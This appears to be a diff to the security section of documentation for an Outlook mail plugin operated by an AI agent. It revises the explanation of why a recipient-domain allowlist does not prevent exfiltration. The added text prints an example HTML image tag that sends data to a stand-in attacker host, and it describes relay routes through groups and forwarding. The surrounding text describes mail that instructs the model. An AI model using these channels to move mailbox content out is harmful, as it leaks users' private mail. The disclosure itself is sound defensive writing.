@@ -168,14 +168,25 @@ model is reading has no input through which to suggest sending as someone else.
 message cannot get mail sent *as* someone else. On its own it does nothing about the larger threat
 on this surface, which is **exfiltration**: subject and body remain caller input, so a message that
 successfully instructs the model can have mailbox content sent onward, signed with your domain's
-DKIM. `OUTLOOK_ALLOWED_RECIPIENT_DOMAINS` is the gate aimed at that one — with it set, even a fully
-compromised caller can only reach addresses you already control.
+DKIM. `OUTLOOK_ALLOWED_RECIPIENT_DOMAINS` narrows that one, but read what it actually constrains: it
+bounds where a message may be **addressed**, not where its **content** can travel. Two paths leave
+it fully intact:
 
-Residual risk remains after both gates, and is worth stating plainly: there is no rate limit, and
-no local audit trail of what was sent — the record is the sending mailbox's Sent Items. Content can
-still move between two allowed domains. Enable sending only where the agent driving the plugin is
-one you would trust with an outbound mail client, and prefer `create_draft` wherever a human can
-press send.
+- **Remote resources in the body.** Bodies are sent as HTML and are not sanitized. A message
+  addressed to an allowed domain can still carry `<img src="https://attacker.example/p?d=…">`, and
+  the data reaches that host the first time the mail is rendered with remote images — or prefetched
+  by a scanner. `logoUrl` in the template engine is escaped but not host-restricted, and is the
+  same channel.
+- **Relays inside an allowed domain.** The check is on the recipient's SMTP domain, not on
+  delivery. An allowed-domain address that is a distribution group with external members, an
+  external mail contact, or a mailbox with a forwarding rule, is a relay this gate approves.
+
+So the honest statement is: pinning the sender stops impersonation, and bounding recipient domains
+stops the *simplest* exfiltration. Neither closes egress. On top of that there is no rate limit and
+no local audit trail — the record of what was sent is the sending mailbox's Sent Items.
+
+Enable sending only where the agent driving the plugin is one you would trust with an outbound mail
+client, and prefer `create_draft` wherever a human can press send.
 
 Use application `Mail.Read` for the default twelve-tool catalog. Enabling the five write tools
 requires `Mail.ReadWrite`, and the send gate requires `Mail.Send`. `PLUGIN_ALLOW_WRITES=false` always
